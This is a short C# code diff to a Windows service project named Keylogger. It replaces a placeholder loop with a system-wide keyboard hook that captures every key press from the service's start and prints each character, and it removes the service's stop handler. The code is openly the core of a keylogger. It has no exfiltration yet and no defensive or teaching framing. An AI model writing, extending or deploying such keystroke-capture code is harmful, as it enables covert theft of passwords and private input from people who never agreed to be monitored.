@@ -1,5 +1,7 @@
-﻿using System;
+﻿using Gma.System.MouseKeyHook;
+using System;
 using System.ServiceProcess;
+using System.Windows.Forms;
 
 namespace Keylogger
 {
@@ -21,14 +23,16 @@ namespace Keylogger
 
         protected override void OnStart(string[] args)
         {
-            while (true)
-            {
-                Console.WriteLine("I'm working.");
-            }
+            IKeyboardMouseEvents hook = Hook.GlobalEvents();
+
+            hook.KeyPress += OnKeyPressed;
+
+            Application.Run();
         }
 
-        protected override void OnStop()
+        private static void OnKeyPressed(object sender, KeyPressEventArgs args)
         {
+            Console.WriteLine(args.KeyChar.ToString());
         }
     }
 }
